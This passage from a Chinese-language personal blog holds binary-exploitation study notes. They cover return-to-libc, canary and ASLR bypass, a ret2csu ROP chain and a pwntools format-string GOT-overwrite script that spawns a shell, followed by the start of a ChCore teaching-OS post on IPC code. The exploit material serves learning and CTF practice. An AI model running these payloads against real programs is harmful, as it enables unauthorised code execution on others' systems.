拿到它的真实地址</span><br><span class="line"></span><br><span class="line">    `puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]`</span><br><span class="line"></span><br><span class="line">  - 需要puts/write或其他输出的函数 把真实地址传过来</span><br><span class="line"></span><br><span class="line">    `puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]`</span><br><span class="line"></span><br><span class="line">  - 需要一个可以二次利用栈溢出的地址</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    main = <span class="number">0x123456</span><span class="comment">#真实地址</span></span><br><span class="line">    main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据call的参数对寄存器或栈的要求 布置好内容</p>
<p><code>payload1 = pad + p32(puts_plt) + p32(main) + p32(puts_got)</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(p.recv()[:4])</span><br><span class="line">base_addr = puts_addr - puts_offset</span><br></pre></td></tr></table></figure></li>
</ul>
<p>最后根据地址布置好栈 调用</p>
<p><code>payload2 = pad + p32(system_addr) + pad4 + p32(binsh_addr)</code></p>
<p>pad4是调用system的时候push进去的retaddr binsh_addr是第一个参数</p>
<h3 id="phase-5-保护全开"><a href="#phase-5-保护全开" class="headerlink" title="phase 5 (保护全开)"></a>phase 5 (保护全开)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsp--&gt;  buf</span><br><span class="line">...</span><br><span class="line">rbp-8--&gt;  canary</span><br><span class="line">rbp  --&gt;  saved rbp</span><br><span class="line">rbp+8 --&gt; retaddr</span><br></pre></td></tr></table></figure>

<h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>canary为了防止被输出 最低位通常为0x0，用于截断字符串</p>
<p>栈溢出时覆盖一位即可，可以拿到canary及其他数据</p>
<h4 id="绕过ASLR-PIE"><a href="#绕过ASLR-PIE" class="headerlink" title="绕过ASLR PIE"></a>绕过ASLR PIE</h4><p>所有地址都是随机的，但是可以通过泄露的方式拿到</p>
<ul>
<li>泄露saved rbp 拿到stack地址</li>
<li>泄露retaddr 拿到text地址</li>
<li>main函数的retaddr里存放了__libc_start_main+243</li>
</ul>
<p>低12位不会被随机 可以用 <code>addr_leak &gt;&gt; 12 &lt;&lt; 12 | (addr &amp; 0xfff)</code>的方式配合ida获得任意地址</p>
<p>或者直接partial write 只覆盖低12位</p>
<h4 id="绕过NX-（ROP）"><a href="#绕过NX-（ROP）" class="headerlink" title="绕过NX （ROP）"></a>绕过NX （ROP）</h4><p><code>ROPgadget --binary rop_x64</code> 展示所有的gadgets</p>
<p>栈不可执行，或栈地址随机化 </p>
<p>只能执行其他确定地址上的任意代码，可以根据一些gadget配合栈的布置构造函数的调用</p>
<p>以_libc_csu_init  64bit为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>

<p>可以通过如下方法执行任意函数并给三个参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,addr</span>):</span><br><span class="line">    <span class="comment"># rdi = r15, rsi = r14, rdx = r13</span></span><br><span class="line">    <span class="comment"># r12 = addr of function want to call</span></span><br><span class="line">    <span class="comment"># rbx should be 0 and rbp should be 1</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * pad + p64(fake_ebp)</span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(csu_part2_addr) </span><br><span class="line">    <span class="comment">#pop rbx rbp r12 r13 r14 r15</span></span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(csu_part1_addr)</span><br><span class="line">    <span class="comment">#mov rdx rsi edi</span></span><br><span class="line">    <span class="comment">#call *r12</span></span><br><span class="line">    <span class="comment">#add rsp ,8  pop .......</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span>* <span class="number">56</span></span><br><span class="line">    <span class="comment">#ret</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">addr,arg1,arg2,arg3,ret_addr</span>):</span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,addr,arg3,arg2,arg1,ret_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>第一次利用：write 泄露地址，拿到libc基址</p>
<p>第二次利用：read bss段写入system地址</p>
<p>第三次利用：read bss段写入&#x2F;bin&#x2F;sh 或&#x2F;bin&#x2F;bash</p>
<p>第四次利用：执行bss段记录的system函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">call(puts_got,puts_got,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">7</span>)[:<span class="number">6</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">call(gets_got,bss_base+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line"><span class="comment"># sendline send matters</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">call(gets_got,bss_base+<span class="number">0x200</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">p.sendline(p64(system_addr))</span><br><span class="line">call(bss_base+<span class="number">0x200</span>,bss_base+<span class="number">0x100</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br></pre></td></tr></table></figure>



<h2 id="格式化字符串-format-string"><a href="#格式化字符串-format-string" class="headerlink" title="格式化字符串(format string)"></a>格式化字符串(format string)</h2><p><code>printf(&quot;%p%p&quot;)</code>遇到%会默认有后续参数，然后拿到值进行输出，并不会检查参数个数</p>
<p>64位情况下 格式化字符串本身是rdi，第一个%会输出rsi 后续是rdx rcx r8 r9</p>
<p>第六个%开始会输出栈上的数据</p>
<ul>
<li><p>%p 输出8字节的数据</p>
</li>
<li><p>%s 把数据作为字符串的首地址 输出此地址对应的字符串(\0截断) 可用于泄露任意地址</p>
</li>
<li><p>%n 把已经输出的字节个数写入此数据对应的地址中 可用于修改任意地址</p>
</li>
<li><p>%k$p 输出第k个位置的数据</p>
</li>
<li><p>%kc 输出k bytes的字符</p>
</li>
</ul>
<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>找到格式化字符串本身在栈上的位置，可用<code>AAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code>查看哪个位置出现0x41 假设为k</p>
<p><code>payload=&#39;addr&#39;+&#39;%k$s&#39;</code> 可用输出addr</p>
<p>但由于地址为小端 且64位有8bytes地址 会被\0截断 所以需要把地址放后面</p>
<p><code>payload = &#39;%k+1$s&#39;+pad+&#39;addr&#39;</code> 前面凑8bytes  addr右移一位(8bytes)</p>
<h3 id="修改地址"><a href="#修改地址" class="headerlink" title="修改地址"></a>修改地址</h3><p><code>payload = &#39;%&#123;x&#125;c%&#123;k&#125;$n&#39;+ pad + addr</code> 把addr放到第k个位置 先用<code>%&#123;x&#125;c</code>输出x个字符 然后数值x会写入地址addr中</p>
<ul>
<li>n 4bytes</li>
<li>hn 2bytes</li>
<li>hhn 1byte</li>
</ul>
<p>例如修改printf的got表（0x601028）中存储的地址为system地址（0x7f9940d4f3a0）</p>
<p>可以一次写入2bytes 注意是小端</p>
<p>0x601028 地址存入0xf3a0</p>
<p>0x60102a 地址存入0x40d4</p>
<p>0x60102c 地址存入0x7f99</p>
<p>一次写1byte 会导致payload太长 可能破坏了栈</p>
<p>一次写4byte 会导致输出的字符输太多 太慢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;%7$sAAAA&#x27;</span>.encode() + p64(printf_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Format String\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">recv = p.recv()</span><br><span class="line">printf_addr = u64(recv[:<span class="number">6</span>]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr_array = <span class="built_in">bytearray</span>.fromhex(<span class="built_in">hex</span>(sys_addr)[<span class="number">2</span>:])</span><br><span class="line">c = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        c[j] *= <span class="number">256</span></span><br><span class="line">        c[j] += sys_addr_array[-i-j*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">k = <span class="number">12</span></span><br><span class="line">block = <span class="number">16</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f1 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>c%<span class="subst">&#123;k&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f1)</span><br><span class="line">payload += f1 + <span class="string">&#x27;A&#x27;</span> * pad </span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">0</span>])</span><br><span class="line">acc = c[<span class="number">0</span>] + pad </span><br><span class="line">c[<span class="number">1</span>] -= acc</span><br><span class="line"><span class="keyword">while</span> c[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">    c[<span class="number">1</span>] += <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">f2 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>c%<span class="subst">&#123;k+<span class="number">1</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f2)</span><br><span class="line">payload += f2 + <span class="string">&#x27;A&#x27;</span> * pad </span><br><span class="line"><span class="built_in">print</span>(acc+c[<span class="number">1</span>])</span><br><span class="line">acc += c[<span class="number">1</span>] + pad </span><br><span class="line">c[<span class="number">2</span>] -= acc</span><br><span class="line"><span class="keyword">while</span> c[<span class="number">2</span>] &lt; <span class="number">0</span>:</span><br><span class="line">    c[<span class="number">2</span>] += <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">f3 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">2</span>]&#125;</span>c%<span class="subst">&#123;k+<span class="number">2</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f3)</span><br><span class="line">payload += f3 + <span class="string">&#x27;A&#x27;</span> * pad</span><br><span class="line"><span class="built_in">print</span>(acc+c[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.encode()</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure>



<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><ul>
<li>F5 看C语言  空格 看汇编</li>
<li>shift+F12 看字符串</li>
<li>右键可以找到引用地址  重命名等</li>
<li>展示的汇编是intel语法 AT&amp;T可以通过<code>objdump -d xx &gt;&gt; xx.txt</code>查看</li>
</ul>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><ul>
<li>remote 远程 process本地</li>
<li>ELF 加载.so</li>
<li>gdb.attach 本地调试</li>
<li>sendline,recv,recvuntil</li>
<li>p64,u64</li>
</ul>
<h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><ul>
<li>run运行到断点或结束  start从第一行开始运行</li>
<li>x 地址或$寄存器  看数据 &#x2F;g 8bytes &#x2F;s字符串</li>
<li>info reg 看寄存器</li>
<li>b *地址&#x2F;label 断点  c继续 si单步 n不进入函数 finish跳出函数</li>
<li>got 看got表 vmmap看内存地址分布</li>
</ul>
<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><code>ROPgadget --binary xxx</code></p>
<ul>
<li>–string</li>
<li>grep</li>
</ul>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><code>checksec xxx</code></p>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul>
<li>recvuntil 最后加不加\n</li>
<li>sendline与send不同 导致重复</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/chcore/IPC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/22/chcore/IPC/" class="post-title-link" itemprop="url">IPC</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-01-22 20:26:50" itemprop="dateCreated datePublished" datetime="2024-01-22T20:26:50+08:00">2024-01-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/chcore/" itemprop="url" rel="index"><span itemprop="name">chcore</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>9.6k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>35 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> cap;</span><br><span class="line"></span><br><span class="line">        cap = chcore_thread_create(routine, <span class="number">0</span>, <span class="number">0</span>, TYPE_USER);</span><br><span class="line">        chcore_bug_on(cap &lt; <span class="number">0</span>);</span><br><span class="line">        __chcore_set_procm_cap(cap);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">routine</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret, cap;</span><br><span class="line"></span><br><span class="line">        spawn(<span class="string">&quot;/user.bin&quot;</span>, &amp;cap); <span class="comment">/* Test spawn function */</span></span><br><span class="line">        ipc_register_server(lab4_test_ipc_dispatch);</span><br><span class="line">        spawn(<span class="string">&quot;/ipc_client.bin&quot;</span>, &amp;cap); <span class="comment">/* Test IPC */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ipc_register_server</span><span class="params">(server_handler server_handler)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> <span class="title">vm_config</span>;</span></span><br><span class="line">        vm_config.buf_base_addr = SERVER_BUF_BASE;</span><br><span class="line">        vm_config.buf_size = SERVER_BUF_SIZE;</span><br><span class="line">        vm_config.stack_base_addr = SERVER_STACK_BASE;</span><br><span class="line">        vm_config.stack_size = SERVER_STACK_SIZE;</span><br><span class="line">        ret = __chcore_sys_register_server(</span><br><span class="line">                (u64)server_handler, MAX_CLIENT, (u64)&amp;vm_config);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">u64 <span class="title function_">sys_register_server</span><span class="params">(u64 callback, u64 max_client, u64 vm_config_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">server</span> =</span> current_thread;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">server_ipc_config</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> *<span class="title">vm_config</span>;</span></span><br><span class="line">        <span class="type">int</span> r;</span><br><span class="line">        server_ipc_config = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> server_ipc_config));</span><br><span class="line">        server_ipc_config-&gt;callback = callback;</span><br><span class="line">        server_ipc_config-&gt;max_client = max_client;</span><br><span class="line">        server_ipc_config-&gt;conn_bmp =</span><br><span class="line">                kzalloc(BITS_TO_LONGS(max_client) * <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class="line">        r = copy_from_user(</span><br><span class="line">                (<span class="type">char</span> *)vm_config, (<span class="type">char</span> *)vm_config_ptr, <span class="keyword">sizeof</span>(*vm_config));</span><br><span class="line">        server-&gt;general_ipc_config = server_ipc_config;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">lab4_test_ipc_dispatch</span><span class="params">(<span class="keyword">struct</span> ipc_msg *ipc_msg, u64 client_pid)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret_cap, write_val;</span><br><span class="line">        <span class="type">bool</span> ret_with_cap = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = ipc_msg-&gt;data_len;</span><br><span class="line">        <span class="keyword">while</span> ((i * <span class="number">4</span>) &lt; len) &#123;</span><br><span class="line">            ret += ((<span class="type">int</span> *)ipc_get_msg_data(ipc_msg))[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret_with_cap)</span><br><span class="line">                ipc_return_with_cap(ipc_msg, ret);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ipc_return(ipc_msg, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sys_ipc_return</span><span class="params">(u64 ret, u64 cap_num)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span> =</span> current_thread-&gt;active_conn;</span><br><span class="line">        <span class="keyword">if</span> (cap_num != <span class="number">0</span>) &#123;</span><br><span class="line">                ipc_send_cap_to_client(conn, cap_num);</span><br><span class="line">        &#125;</span><br><span class="line">        conn-&gt;source-&gt;thread_ctx-&gt;state = TS_RUNNING;</span><br><span class="line">        conn-&gt;source-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class="line">        thread_migrate_to_client(conn, ret);</span><br><span class="line">     	BUG(<span class="string">&quot;This function should never\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">thread_migrate_to_client</span><span class="params">(<span class="keyword">struct</span> ipc_connection *conn, u64 ret_value)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">source</span> =</span> conn-&gt;source;</span><br><span class="line">        current_thread-&gt;active_conn = <span class="literal">NULL</span>;</span><br><span class="line">        arch_set_thread_return(source, ret_value);</span><br><span class="line">        switch_to_thread(source);</span><br><span class="line">        